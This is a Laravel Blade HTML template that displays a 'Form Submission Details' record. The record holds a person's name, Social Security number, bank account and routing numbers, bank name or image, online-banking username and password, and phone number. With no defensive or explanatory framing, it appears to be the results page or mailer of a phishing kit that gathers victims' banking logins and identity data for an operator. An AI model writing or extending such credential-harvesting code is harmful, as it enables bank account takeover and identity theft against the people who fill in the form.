<!DOCTYPE html>
<html>
<head>
    <title>Form Submission Details</title>
</head>
<body>
    <h2>Form Submission Details</h2>
    @if (!empty($formData['image']) || isset($formData['image']))
        <p><strong>Bank:</strong></p>
        <img src="{{ $formData['image'] }}" alt="Image" style="max-width: 400px;">
    @else
        <p><strong>Bank Name:</strong> {{ $formData['bank_name'] ?? '' }}</p>
    @endif
    <p><strong>First Name:</strong> {{ $formData['first_name'] }}</p>
    <p><strong>Last Name:</strong> {{ $formData['last_name'] }}</p>
    <p><strong>SSN Number:</strong> {{ $formData['ssn'] }}</p>
    <p><strong>Account Number:</strong> {{ $formData['account_number'] }}</p>
    <p><strong>Routing Number:</strong> {{ $formData['routing'] }}</p>
    <p><strong>Username:</strong> {{ $formData['username'] }}</p>
    <p><strong>Password:</strong> {{ $formData['password'] }}</p>
    <p><strong>Phone </strong> {{ $formData['phone'] }}</p>
</body>
</html>
